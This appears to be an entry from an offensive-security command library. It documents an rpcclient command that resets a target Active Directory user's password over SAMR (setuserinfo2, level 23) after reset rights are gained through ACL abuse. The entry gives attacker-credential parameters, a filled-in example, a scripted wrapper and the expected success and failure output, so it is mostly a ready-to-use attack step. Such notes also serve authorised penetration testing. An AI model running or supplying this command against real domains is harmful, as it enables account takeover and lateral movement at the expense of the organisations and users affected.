---
type: command
executor: bash
data: >-
  rpcclient -U '$_ATTACKER_USER%$_ATTACKER_PASSWORD' -W $_DOMAIN -c
  "setuserinfo2 $_TARGET_USER 23 $_NEW_PASSWORD"
output: null
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
tags:
  - active-directory
  - password-reset
  - rpc
verified: true
validated: true
---

# rpcclient-setuserinfo2-password-change

## Command

```bash
rpcclient -U '$_ATTACKER_USER%$_ATTACKER_PASSWORD' -W $_DOMAIN -c "setuserinfo2 $_TARGET_USER 23 $_NEW_PASSWORD"
```

## Description

This command uses rpcclient from the Samba suite to connect to a Windows Domain Controller via the SAMR RPC interface and reset a target user's password using info level 23. It is invoked after gaining reset permissions through AD ACL abuse. Use this for NTLM-authenticated password changes in domain environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_USER | Username of the account with password reset rights | Yes |
| $_ATTACKER_PASSWORD | Plaintext password for the attacker account | Yes |
| $_DOMAIN | Target domain name (e.g., corp.local) | Yes |
| $_TARGET_USER | Username of the target account to reset | Yes |
| $_NEW_PASSWORD | New password to set for the target user | Yes |
| -U | Specifies username and password for authentication | Built-in |
| -W | Specifies the workgroup/domain | Built-in |
| -c | Executes the specified command string | Built-in |

## Examples

### Basic Usage

```bash
rpcclient -U 'svcacct%P@ssw0rd' -W CORP -c "setuserinfo2 jdoe 23 NewP@ss123!"
```

### Advanced Usage

For scripted use, wrap in a bash script with error checking:

```bash
rpcclient -U '$_ATTACKER_USER%$_ATTACKER_PASSWORD' -W $_DOMAIN -c "setuserinfo2 $_TARGET_USER 23 $_NEW_PASSWORD" || echo "Failed: Check ACLs"
```

## Expected Output

Successful execution:
```
setuserinfo2
result was OK
```

Failure (insufficient rights):
```
NT_STATUS_ACCESS_DENIED
```

## Related

- [[procedures/Abuse-AD-ACLs-to-Reset-User-Password]]
- [[tools/rpcclient]]
